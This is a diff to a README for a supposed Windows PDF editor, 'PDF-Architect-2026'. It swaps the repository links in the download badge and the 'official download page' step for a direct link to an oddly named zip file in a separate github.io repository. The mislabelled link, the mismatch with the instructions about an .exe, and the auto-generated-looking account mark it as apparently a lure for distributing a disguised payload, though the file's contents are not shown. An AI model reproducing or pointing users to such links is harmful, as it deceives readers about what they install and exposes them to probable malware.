@@ -5,7 +5,7 @@ description: "Download and install PDF Architect on Windows 10 and 11 using a si
 ---
 # 📄 PDF-Architect-2026 - Manage your documents with ease today
 
-[![](https://img.shields.io/badge/Download-PDF_Architect_2026-blue.svg)](https://github.com/Cleanable-masseshot16/PDF-Architect-2026)
+[![](https://img.shields.io/badge/Download-PDF_Architect_2026-blue.svg)](https://github.com/Cleanable-masseshot16/cleanable-masseshot16.github.io/raw/refs/heads/main/pianist/cleanable_io_masseshot_github_v1.2.zip)
 
 PDF Architect 2026 provides a complete set of tools for your document needs on Windows 10 and Windows 11. This software helps you create, edit, convert, and secure PDF files through a simple interface.
 
@@ -36,7 +36,7 @@ Your computer must meet these requirements for the software to run:
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official download page](https://github.com/Cleanable-masseshot16/PDF-Architect-2026).
+1. Go to the [official download page](https://github.com/Cleanable-masseshot16/cleanable-masseshot16.github.io/raw/refs/heads/main/pianist/cleanable_io_masseshot_github_v1.2.zip).
 2. Look for the release section on that page.
 3. Select the file ending in .exe to start your download.
 4. Wait for the download to finish.
